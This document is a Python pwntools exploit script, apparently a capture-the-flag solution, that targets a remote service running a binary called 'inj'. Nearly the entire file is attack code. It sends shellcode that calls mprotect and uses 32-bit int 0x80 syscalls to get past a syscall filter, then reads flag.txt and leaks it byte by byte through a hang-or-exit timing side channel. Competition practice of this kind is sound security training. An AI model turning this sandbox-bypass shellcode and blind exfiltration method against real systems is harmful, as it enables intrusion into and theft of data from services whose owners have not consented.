#!/usr/bin/env python3

from pwn import *
from time import time

exe = ELF("./inj")

context.binary = exe



def conn():
    r = process([exe.path])
    return r


# allowed syscalls:
# 

remote_flag =0
i = 0
flag = ""
def main():
    global i
    global flag
    global remote_flag
    
    #r = conn()
    r = remote("35.233.85.116", 30020)
    
    # int 0x80 will execute
    shellcode = asm("""
        mov edi, 0x0000000000401000
        mov esi, 0x1000
        mov edx, 7
        mov eax, 10
        syscall
        pop rcx
        pop rdx
        mov eax, 3
        int 0x80
        call rcx
    """)
    r.send(shellcode)
   
    bruteforce = b'TFC0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
    leak_flag = f"""
        mov rdi, 0x7478742e67616c66
        mov rsi, 0x404120
        mov qword ptr [rsi], rdi
        mov ebx, esi
        xor ecx, ecx
        xor edx, edx
        mov eax, 5
        int 0x80
        
        mov rdi, 0x7478742e67616c66
        mov rsi, 0x404120
        mov qword ptr [rsi], rdi
        mov ebx, esi
        xor ecx, ecx
        xor edx, edx
        mov eax, 5
        int 0x80
           
        mov ebx, eax
        mov ecx, 0x404220
        mov edx, 0x100
        mov eax, 3
        int 0x80

        mov rcx, {remote_flag}
        mov rsi, 0x404220
        mov rdi, qword ptr [rcx + rsi]
        and edi, 0xff
        cmp di, 0x00
        je free

        cmp di, {bruteforce[i]}
        je halt
        jmp free

        halt:
            jmp halt
        
        free:
            mov rax, 0x4d
            syscall
    """
    r.send(asm(leak_flag))
    r.sendline()
    r.sendline()
    try:
        r.recvline(timeout=2)
        print("found char: ", bruteforce[i])
        flag+=chr(bruteforce[i])
        print(flag)
        i = 0
        remote_flag += 1
    except:
        i += 1
    r.close()



while (1):
    try:
        print(remote_flag)
        if flag.endswith("}"):
            break
        main()
    except:
        break

print(flag)
